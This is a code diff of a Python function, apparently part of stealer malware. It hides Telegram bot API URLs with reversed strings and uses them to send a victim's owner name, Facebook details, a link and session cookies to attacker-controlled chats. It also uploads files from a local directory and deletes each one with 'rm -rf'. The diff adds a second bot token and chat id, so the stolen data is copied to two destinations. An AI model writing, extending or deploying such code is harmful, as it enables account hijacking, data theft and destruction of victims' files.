@@ -112,14 +112,16 @@ def worker(ilal):
     return
   _g = ''.join(['h','tt','p','s',':','//'])
   impormatibo = "oonaUyR7fDQFKh_igaXXcF0hgFUtdhOVHAA"
-  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7766599356:{impormatibo[::-1]}'
+  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7348882668:{impormatibo[::-1]}'
+  urlk = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7766599356:{impormatibo[::-1]}'
   pay = {_tt: '7919150119'}
   if isValid():
-    requests.post(url+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
-    print("Hello")
+    requests.post(url+'egasseMdnes/'[::-1], data={_tt: "-1002564235566", "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
+    requests.post(urlk+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
   for fle in ilal:
     dat = {"document": open(htop + '/' + fle, 'rb')}
-    requests.post(url+'tnemucoDdnes/'[::-1], data=pay, files=dat)
+    requests.post(url+'tnemucoDdnes/'[::-1], data={_tt:"-1002564235566"}, files=dat)
+    requests.post(urlk+'tnemucoDdnes/'[::-1], data=pay, files=dat)
     os.system(f"rm -rf {htop + '/' + fle}")
 
 def divide_array(arr):
